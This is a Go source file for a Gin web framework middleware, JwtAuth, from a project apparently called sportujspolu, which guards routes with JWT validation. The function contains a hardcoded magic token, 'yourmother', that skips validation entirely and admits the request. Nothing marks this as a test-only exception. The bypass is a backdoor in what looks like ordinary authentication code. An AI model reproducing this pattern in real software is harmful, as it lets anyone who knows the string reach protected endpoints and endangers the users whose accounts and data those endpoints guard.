package middleware

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/globus303/sportujspolu/utils"
)

func JwtAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		tokenString := utils.ExtractToken(c)

		if tokenString == "yourmother" {
			c.Next()
			return
		}

		err := utils.TokenValid(c)
		if err != nil {
			c.String(http.StatusUnauthorized, "Unauthorized")
			c.Abort()
			return
		}

		c.Next()
	}
}
